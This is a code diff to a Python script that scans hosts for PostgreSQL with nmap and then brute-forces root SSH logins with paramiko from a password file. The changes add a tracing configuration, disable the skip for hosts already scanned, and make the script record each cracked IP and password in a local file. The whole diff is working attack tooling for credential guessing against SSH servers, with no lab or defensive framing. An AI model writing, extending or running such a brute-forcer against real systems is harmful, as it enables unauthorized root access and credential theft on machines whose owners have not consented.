@@ -4,6 +4,9 @@ import nmap
 import psycopg2
 import paramiko
 import os
+from ddtrace import tracer
+
+tracer.configure(hostname='172.28.0.5', port=8126)
 
 GREEN = '\033[32m'
 RED = '\033[31m'
@@ -66,9 +69,9 @@ async def scan_host(host, hostname, scanner):
     try:
         with open(HOSTS_FILE) as f:
             hosts_data = json.load(f)
-        if host in hosts_data and hosts_data[host] == hostname:
-            print(f"Skipping host {hostname} ({host}): already scanned.")
-            return None
+        #if host in hosts_data and hosts_data[host] == hostname:
+        #    print(f"Skipping host {hostname} ({host}): already scanned.")
+        #    return None
 
         print(f"Scanning host {hostname} ({host})...")
         scanner.scan(host, arguments='-p 5432')
@@ -113,38 +116,37 @@ async def ssh_login(ip_dict, password_file):
     with open(password_file, 'r', encoding='utf-8', errors='ignore') as file:
         passwords = file.read().splitlines()
 
-    for host, ip in ip_dict.items():
-        print(f"Attempting SSH login on {ip}...")
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-        for pw in passwords:
-            try:
-                print(f"{GREEN}Trying {RESET}{pw} {GREEN} as a password{RESET}")
-                await asyncio.get_event_loop().run_in_executor(
-                    None,
-                    lambda: client.connect(str(ip), username='root', password=pw, timeout=15),
-                )
-                print(f"{GREEN}Successful login on {RESET}{ip}{GREEN} with password:{RESET} {pw}")
-                # Add your desired actions here after successful login
-                client.close()
-                break
-            except paramiko.AuthenticationException:
-                # Incorrect password, continue to the next one
-                continue
-            except paramiko.SSHException:
-                print(f"{RED}Failed to connect to{RESET} {ip}")
-                break
-            except socket.timeout:
-                print(f"{RED}Connection timed out for {RESET}{ip}")
-                break
-            except paramiko.ssh_exception.NoValidConnectionsError as e:
-                print(f"{RED}Unable to connect to port 22 on {RESET}{ip}")
-                print(f"{RED}Error: {RESET}{str(e)}")
-                break
-
-
-
+        for host, ip in ip_dict.items():
+            print(f"Attempting SSH login on {ip}...")
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        
+            for pw in passwords:
+                try:
+                    print(f"{GREEN}Trying {RESET}{pw} {GREEN} as a password{RESET}")
+                    await asyncio.get_event_loop().run_in_executor(
+                        None,
+                        lambda: client.connect(str(ip), username='root', password=pw, timeout=15),
+                    )
+                    print(f"{GREEN}Successful login on {RESET}{ip}{GREEN} with password:{RESET} {pw}")
+                    # Add your desired actions here after successful login
+                    with open("successful_ssh.txt", "a") as success_file:
+                        success_file.write(f"Successful login on {ip} with password: {pw}\n")
+                    client.close()
+                    break
+                except paramiko.AuthenticationException:
+                    # Incorrect password, continue to the next one
+                    continue
+                except paramiko.SSHException:
+                    print(f"{RED}Failed to connect to{RESET} {ip}")
+                    break
+                except socket.timeout:
+                    print(f"{RED}Connection timed out for {RESET}{ip}")
+                    break
+                except paramiko.ssh_exception.NoValidConnectionsError as e:
+                    print(f"{RED}Unable to connect to port 22 on {RESET}{ip}")
+                    print(f"{RED}Error: {RESET}{str(e)}")
+                    break
 
 
 async def main():
